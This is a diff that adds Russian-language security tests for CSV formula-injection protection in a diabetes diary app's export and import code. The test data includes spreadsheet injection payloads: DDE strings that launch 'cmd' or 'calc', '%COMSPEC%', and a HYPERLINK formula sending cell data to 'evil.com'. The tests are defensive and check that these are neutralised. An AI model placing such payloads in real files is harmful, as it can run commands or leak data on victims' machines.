@@ -6,6 +6,11 @@ import {
   calculateDayAggregates,
   calculateMonthlyStats,
   groupEntriesByDay,
+  isFormulaInjection,
+  escapeFormulaInjection,
+  unescapeFormulaInjection,
+  formatCsvCell,
+  exportEntriesToCSV,
 } from './diabetes';
 import { DiaryEntry } from '../types/diabetes';
 
@@ -326,4 +331,243 @@ test('parseExcelDiary: correctly imports complex Russian diabetes CSV/Excel with
   assert.equal(result.entries[6].carbs, 6);
   assert.equal(result.entries[6].xe, 0.5);
   assert.equal(result.entries[6].calories, 24);
+});
+
+// --- ТЕСТЫ БЕЗОПАСНОСТИ CSV / FORMULA INJECTION (SEC-03) ---
+
+test('SEC-03: isFormulaInjection распознает префиксы =, +, -, @, |, % и обходы через пробелы и спецсимволы', () => {
+  // 1. Прямые опасные префиксы
+  assert.equal(isFormulaInjection('=1+1'), true, '= должен распознаваться');
+  assert.equal(isFormulaInjection('=HYPERLINK("http://attacker.com")'), true);
+  assert.equal(isFormulaInjection('+cmd|\'/C calc\'!A0'), true, '+ должен распознаваться');
+  assert.equal(isFormulaInjection('-2+3+cmd|\'/C calc\'!A0'), true, '- должен распознаваться');
+  assert.equal(isFormulaInjection('@SUM(A1:A10)'), true, '@ должен распознаваться');
+  assert.equal(isFormulaInjection('|calc'), true, '| должен распознаваться');
+  assert.equal(isFormulaInjection('%COMSPEC%'), true, '% должен распознаваться');
+
+  // 2. Обходы через пробелы в начале
+  assert.equal(isFormulaInjection('   =1+1'), true, 'Пробелы перед = не должны помогать обойти фильтр');
+  assert.equal(isFormulaInjection('      @SUM(B1:B2)'), true);
+  assert.equal(isFormulaInjection('\u00A0=1+1'), true, 'Неразрывный пробел (U+00A0) перед = должен блокироваться');
+
+  // 3. Обходы через табуляцию и переносы строк
+  assert.equal(isFormulaInjection('\t=1+1'), true, 'Табуляция перед = должна блокироваться');
+  assert.equal(isFormulaInjection('\tcmd'), true, 'Ведущая табуляция должна блокироваться');
+  assert.equal(isFormulaInjection('\r\n=HYPERLINK()'), true, 'Ведущий перенос строки перед = должен блокироваться');
+  assert.equal(isFormulaInjection('\n-1+2'), true, 'Ведущий перенос строки перед - должен блокироваться');
+
+  // 4. Обычные безопасные пользовательские строки и даты не должны помечаться как формулы
+  assert.equal(isFormulaInjection('Обед: гречка 150г, курица 120г'), false);
+  assert.equal(isFormulaInjection('Завтрак'), false);
+  assert.equal(isFormulaInjection('2026-11-02'), false);
+  assert.equal(isFormulaInjection('14:30'), false);
+  assert.equal(isFormulaInjection('5.5'), false);
+  assert.equal(isFormulaInjection(''), false);
+  assert.equal(isFormulaInjection('   '), false);
+});
+
+test('SEC-03: escapeFormulaInjection и unescapeFormulaInjection обеспечивают полную обратимость (roundtrip)', () => {
+  // Опасная формула: при экспорте добавляется ведущий апостроф, при импорте — безопасно снимается
+  const dangerous = '=HYPERLINK("http://leak?data=123"; "Отчет")';
+  const escaped = escapeFormulaInjection(dangerous);
+  assert.equal(escaped, `'${dangerous}`, 'Должен быть добавлен ведущий апостроф');
+  const unescaped = unescapeFormulaInjection(escaped);
+  assert.equal(unescaped, dangerous, 'Исходная строка должна быть точно восстановлена');
+
+  // Пользовательский список с дефисом
+  const bullet = '- Измерен сахар перед сном';
+  const escapedBullet = escapeFormulaInjection(bullet);
+  assert.equal(escapedBullet, `'- Измерен сахар перед сном`);
+  assert.equal(unescapeFormulaInjection(escapedBullet), bullet);
+
+  // Пользовательская запись с плюсом
+  const plusNote = '+2 ед РинФаст на коррекцию';
+  const escapedPlus = escapeFormulaInjection(plusNote);
+  assert.equal(escapedPlus, `'+2 ед РинФаст на коррекцию`);
+  assert.equal(unescapeFormulaInjection(escapedPlus), plusNote);
+
+  // Обычная строка не изменяется
+  const regular = 'Обычный обед';
+  assert.equal(escapeFormulaInjection(regular), regular);
+  assert.equal(unescapeFormulaInjection(regular), regular);
+
+  // Строка с одинарной кавычкой не портится, если после кавычки нет триггера формулы
+  const quoted = "'Цитата врача'";
+  assert.equal(escapeFormulaInjection(quoted), quoted);
+  assert.equal(unescapeFormulaInjection(quoted), quoted);
+});
+
+test('SEC-03: formatCsvCell корректно экранирует кавычки, разделители, переносы строк и формулы', () => {
+  // 1. Пустые значения
+  assert.equal(formatCsvCell(null), '');
+  assert.equal(formatCsvCell(undefined), '');
+  assert.equal(formatCsvCell(''), '');
+
+  // 2. Числовые значения (десятичная запятая для русской локали)
+  assert.equal(formatCsvCell(5.5), '5,5');
+  assert.equal(formatCsvCell(12), '12');
+
+  // 3. Формула экранируется апострофом и оборачивается в кавычки
+  assert.equal(formatCsvCell('=1+1'), "\"'=1+1\"");
+  assert.equal(formatCsvCell('   =SUM(A1:A5)'), "\"'   =SUM(A1:A5)\"");
+  assert.equal(formatCsvCell('@dangerous'), "\"'@dangerous\"");
+
+  // 4. Текст с кавычками удваивает внутренние кавычки
+  assert.equal(formatCsvCell('Заметка с "кавычками"'), '"Заметка с ""кавычками"""');
+
+  // 5. Текст с разделителем (;) оборачивается в кавычки
+  assert.equal(formatCsvCell('Чай; печенье'), '"Чай; печенье"');
+
+  // 6. Текст с переносом строки оборачивается в кавычки
+  assert.equal(formatCsvCell("Строка 1\nСтрока 2"), "\"Строка 1\nСтрока 2\"");
+
+  // 7. Формула, содержащая кавычки и точку с запятой
+  const complexFormula = '=cmd|"/C calc"!A0; test';
+  assert.equal(formatCsvCell(complexFormula), '"\'=cmd|""/C calc""!A0; test"');
+});
+
+test('SEC-03: exportEntriesToCSV экранирует все текстовые поля, нейтрализует формулы и добавляет UTF-8 BOM', () => {
+  const entries: DiaryEntry[] = [
+    {
+      id: '1',
+      date: '2026-11-02',
+      time: '12:00',
+      glucose: 5.5,
+      carbs: 48,
+      xe: 4.0,
+      rinFast: 4,
+      tresiba: null,
+      calories: 450,
+      notes: '=HYPERLINK("http://evil.com/leak?data="&C2; "Открыть протокол")',
+      createdAt: 1,
+    },
+    {
+      id: '2',
+      date: '2026-11-02',
+      time: '13:00',
+      glucose: 8.0,
+      carbs: null,
+      xe: null,
+      rinFast: null,
+      tresiba: null,
+      calories: null,
+      notes: '-2+3+cmd|\'/C calc\'!A0',
+      createdAt: 2,
+    },
+    {
+      id: '3',
+      date: '2026-11-02',
+      time: '14:00',
+      glucose: 4.2,
+      carbs: 20,
+      xe: 1.7,
+      rinFast: 2,
+      tresiba: null,
+      calories: 180,
+      notes: '   +cmd|\'/C notepad\'!A0', // обход пробелами
+      createdAt: 3,
+    },
+    {
+      id: '4',
+      date: '2026-11-02',
+      time: '18:00',
+      glucose: 6.1,
+      carbs: 60,
+      xe: 5.0,
+      rinFast: 5,
+      tresiba: 14,
+      calories: 600,
+      notes: 'Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем',
+      createdAt: 4,
+    },
+  ];
+
+  const csv = exportEntriesToCSV(entries);
+
+  // 1. Проверяем наличие UTF-8 BOM (\uFEFF)
+  assert.equal(csv.startsWith('\uFEFF'), true, 'CSV должен начинаться с UTF-8 BOM для корректного открытия в Excel');
+
+  // 2. В файле не должно быть ни одной ячейки, начинающейся прямо с =, +, -, @ без апострофа!
+  // Проверяем: после точки с запятой или в начале строки ни одно поле в кавычках не должно начинаться с опасного символа
+  assert.equal(csv.includes(';"='), false, 'Не должно быть неэкранированного ;"="');
+  assert.equal(csv.includes(';"+'), false, 'Не должно быть неэкранированного ;"+"');
+  assert.equal(csv.includes(';"-'), false, 'Не должно быть неэкранированного ;"-"');
+  assert.equal(csv.includes(';"@'), false, 'Не должно быть неэкранированного ;"@"');
+
+  // 3. Проверяем наличие защитного апострофа в опасных ячейках
+  assert.ok(csv.includes('"\'=HYPERLINK'));
+  assert.ok(csv.includes('"\'-2+3+cmd'));
+  assert.ok(csv.includes('"\'   +cmd'));
+
+  // 4. Обычная русская запись со знаками препинания должна быть корректно сохранена
+  assert.ok(csv.includes('"Обычный обед: борщ, хлеб 2 куска; чай с сахарозаменителем"'));
+});
+
+test('SEC-03: Совместимость экспорта в CSV и последующего импорта через parseExcelDiary (полный roundtrip)', async () => {
+  const { parseExcelDiary } = await import('./excelImport');
+
+  const originalEntries: DiaryEntry[] = [
+    {
+      id: 'orig-1',
+      date: '2026-11-02',
+      time: '08:30',
+      glucose: 5.6,
+      carbs: 36,
+      xe: 3.0,
+      rinFast: 4,
+      tresiba: 14,
+      calories: 320,
+      notes: '+2 ед на ДПС перед едой',
+      createdAt: 1,
+    },
+    {
+      id: 'orig-2',
+      date: '2026-11-02',
+      time: '13:15',
+      glucose: 6.8,
+      carbs: 48,
+      xe: 4.0,
+      rinFast: 5,
+      tresiba: null,
+      calories: 450,
+      notes: '- Обед в кафе: салат Цезарь; паста',
+      createdAt: 2,
+    },
+    {
+      id: 'orig-3',
+      date: '2026-11-02',
+      time: '19:00',
+      glucose: 9.4,
+      carbs: 24,
+      xe: 2.0,
+      rinFast: 3,
+      tresiba: null,
+      calories: 250,
+      notes: '=HYPERLINK("http://safe.org"; "Тестовая ссылка")',
+      createdAt: 3,
+    },
+  ];
+
+  // 1. Экспортируем в защищенный CSV
+  const csvContent = exportEntriesToCSV(originalEntries);
+
+  // 2. Имитируем файл браузера и импортируем обратно
+  const file = new File([csvContent], 'exported_diary.csv', { type: 'text/csv' });
+  const importResult = await parseExcelDiary(file);
+
+  assert.equal(importResult.entries.length, 3, 'Все 3 записи должны успешно импортироваться');
+
+  // 3. Проверяем полное восстановление данных и заметок (без мусора и без лишних апострофов)
+  assert.equal(importResult.entries[0].date, '2026-11-02');
+  assert.equal(importResult.entries[0].time, '08:30');
+  assert.equal(importResult.entries[0].glucose, 5.6);
+  assert.equal(importResult.entries[0].notes, '+2 ед на ДПС перед едой', 'Заметка с плюсом должна быть точно восстановлена');
+
+  assert.equal(importResult.entries[1].time, '13:15');
+  assert.equal(importResult.entries[1].glucose, 6.8);
+  assert.equal(importResult.entries[1].notes, '- Обед в кафе: салат Цезарь; паста', 'Заметка со списком и точкой с запятой восстановлена');
+
+  assert.equal(importResult.entries[2].time, '19:00');
+  assert.equal(importResult.entries[2].glucose, 9.4);
+  assert.equal(importResult.entries[2].notes, '=HYPERLINK("http://safe.org"; "Тестовая ссылка")', 'Текст формулы безопасно сохранен и восстановлен');
 });
